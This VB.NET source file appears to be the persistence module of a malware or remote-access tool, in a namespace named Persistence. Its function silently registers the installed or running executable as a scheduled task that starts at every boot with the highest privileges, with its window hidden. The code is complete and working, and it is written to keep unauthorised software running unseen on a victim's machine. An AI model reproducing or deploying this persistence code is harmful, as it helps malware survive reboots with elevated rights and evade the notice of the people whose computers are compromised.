Imports System.IO
Namespace Persistence
    Module SchTask
        Public Function AddtoSchTask()
            Try
                Dim installfullpath As FileInfo
                If Form1.HardInstall = "True" Then
                    installfullpath = New FileInfo(Path.Combine(Environ(Form1.PathS), Form1.InstallName))
                Else
                    installfullpath = New FileInfo(Application.ExecutablePath)
                End If
                Dim pi As New ProcessStartInfo
                With pi
                    .FileName = "schtasks.exe"
                    .Arguments = "/create /f /sc ONSTART /RL HIGHEST /tn " + """'" + Path.GetFileNameWithoutExtension(installfullpath.FullName) + """'" + " /tr " + """'" + installfullpath.FullName + """'"
                    .WindowStyle = ProcessWindowStyle.Hidden
                    .CreateNoWindow = True
                End With
                Process.Start(pi)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
    End Module
End Namespace
